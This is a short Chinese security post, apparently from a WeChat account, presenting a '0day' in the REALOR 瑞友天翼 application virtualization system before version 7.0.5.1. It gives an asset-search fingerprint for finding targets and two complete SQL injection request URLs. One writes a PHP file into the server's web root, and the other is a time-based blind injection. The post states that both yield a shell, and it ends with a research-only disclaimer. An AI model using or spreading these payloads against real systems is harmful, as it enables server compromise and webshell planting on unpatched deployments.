#  【0day】瑞友天翼应用虚拟化系统   
摸鱼sec  摸鱼Sec   2024-05-08 20:33  
  
**影响版本**  
```
version < 7.0.5.1
```  
  
  
**指纹**  
```
app.name="REALOR 瑞友天翼虚拟化平台"
```  
  
  
**sql注入1**  
```
http://xx.xx.xx.xx/hmrao.php?s=/Admin/appsave&appid=1%27);select%200x3c3f70687020706870696e666f28293b3f3e%20into%20outfile%20%27C:\Program%20Files%20(x86)\RealFriend\Rap%20Server\WebRoot\123.php%27%20--+
```  
  
  
**sql注入2**  
```
http://xx.xx.xx.xx/hmrao.php?s=/Admin/appdel&list=1111111%27%29%29%20AND%20%28SELECT%206312%20FROM%20%28SELECT%28SLEEP%285%29%29%29coHe%29%23
```  
  
  
俩个注入都可以shell![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/Yellowdog.png "")  
，以上俩个漏洞均来自新一，欢迎各位师傅关注新一公众号。  
  
  
**仅供安全研究与学习之用，如用于其他用途，由使用者承担全部法律及连带责任，与本公众号无关。**  
  
